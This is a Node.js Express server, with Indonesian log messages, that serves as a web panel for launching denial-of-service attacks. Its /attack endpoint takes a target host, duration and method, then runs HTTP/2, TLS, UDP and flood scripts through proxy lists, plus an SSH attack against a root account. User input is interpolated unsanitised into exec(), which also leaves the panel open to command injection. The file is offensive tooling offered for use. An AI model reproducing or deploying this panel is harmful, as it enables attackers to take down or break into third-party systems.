const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Store progress for each attack (using target URL as key)
const attackProgress = {};

app.post('/attack', (req, res) => {
    const { url: host, time, method, port: customPort } = req.body;
    if (!host || !time || !method) {
        return res.status(400).json({ success: false, message: 'Input tidak lengkap' });
    }

    const port = customPort || 80;

    const attackMethods = {
        'H2': `node ./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
        'TLS': `node ./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
        'FLOOD': `node ./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
        'MIX': `node ./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
        'SKIBIDI': `node ./lib/cache/skibidi.js ${host} ${time}`,
        'UDP': `node ./lib/cache/udp.js ${host} ${port} ${time}`,
        'SSH': `node ./lib/cache/ssh.js ${host} ${port} root ${time}`
    };

    const cmd = attackMethods[method];
    if (!cmd) {
        return res.status(400).json({ success: false, message: 'Metode serangan tidak dikenal' });
    }

    console.log(`Menjalankan perintah: ${cmd}`);

    // Initialize progress to 0 for this target
    attackProgress[host] = 0;

    // Send initial response
    res.json({ success: true, message: `Serangan ${method} dimulai ke ${host}`, progress: 0 });

    const intervalTime = time * 1000 / 100;
    let progressInterval;

    // Simulate progress (since we can't get real progress from exec)
    let progress = 0;
    progressInterval = setInterval(() => {
        progress += 1;
        attackProgress[host] = Math.min(progress, 100); // Update stored progress

        if (progress >= 100) {
            clearInterval(progressInterval);
        }
    }, intervalTime);

    exec(cmd, (err, stdout, stderr) => {
        clearInterval(progressInterval); // Stop interval after exec finishes

        if (err) {
            console.error(`Error menjalankan serangan: ${err}`);
            console.error(`Stderr: ${stderr}`);
            attackProgress[host] = 100; // Ensure progress is 100 even on error
            // Don't send another response here.  The client will get final status via the /progress endpoint.
            return;
        }

        console.log(`Stdout: ${stdout}`);
        attackProgress[host] = 100; // Ensure progress is 100 on success
        // Don't send another response here. The client will get final status via the /progress endpoint.
    });
});

// Endpoint to get the progress of an attack
app.get('/progress', (req, res) => {
    const host = req.query.url; // Get the target URL from the query parameter
    if (!host) {
        return res.status(400).json({ error: 'Target URL is required' });
    }

    const progress = attackProgress[host] || 0; // Get progress from storage, default to 0
    res.json({ progress });
});

app.listen(port, () => {
    console.log(`Web interface aktif di http://localhost:${port}`);
});
